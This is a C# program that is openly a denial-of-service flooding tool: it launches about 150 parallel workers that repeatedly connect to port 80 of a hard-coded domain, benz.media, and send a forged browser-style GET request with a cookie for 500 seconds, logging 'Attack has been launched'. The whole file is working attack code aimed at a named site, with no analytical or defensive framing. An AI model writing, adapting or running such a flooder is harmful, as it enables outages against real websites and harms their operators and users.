using System;
using System.Net;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Net.Http;
using System.Net.Http.Headers;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace t_src {
    class Program { 
        private static readonly int WORKERS = 150, ATTACK_DURATION = 500;
        private static readonly string Target = "benz.media";
        private static readonly string Send = "GET / HTTP/1.1\r\n" + 
                                              "Host: benz.media\r\n" + 
                                              "Connection: keep-alive\r\n" +
                                              "Upgrade-Insecure-Requests: 1\r\n" +
                                              "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36\r\n" +
                                              "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" +
                                              "accept-encoding: gzip,deflate\r\n" +
                                              "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.6,en;q=0.4\r\n" +
                                              "Cookie: CAKEPHP=uglkh2asdasdassaadgksdjklgjklsdjklsdfhkljsfhjklfhsjklsfhjkljklsfhjklsfhjklfshjklfshjklsfhjklsfjklsfjklsfhkljhvkkslb4qevumf0pr4e4; _pk_id.2.9278=482ceb68ec2fb4f4.1481370495.1.1481371739.1481370495.; _pk_ses.2.9278=*\r\n\r\n";

        private static void Main() {
            Console.OutputEncoding = Encoding.UTF8;
            Console.WriteLine("<@> Starting " + WORKERS + " Workers ....");

            for(int index = 0; index <= WORKERS; index+=1) {
                Task Zambie = Task.Run((Action)Connect);
            }

            Console.WriteLine("<@> Attack has been launched for " + ATTACK_DURATION + " seconds ....");
            System.Threading.Thread.Sleep(ATTACK_DURATION*1000);
            Console.WriteLine("<@> Attack has been finished!");
            return ;
        }

        private static void Connect() {
            try {
                while(true) {
                    IPHostEntry entry = Dns.GetHostEntry(Target);
                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                   
                    socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    socket.Connect(entry.AddressList[0], 80);
                    socket.Send(Encoding.ASCII.GetBytes(Send));
                }
            } catch {
                Connect();
            }
        }
    }
}
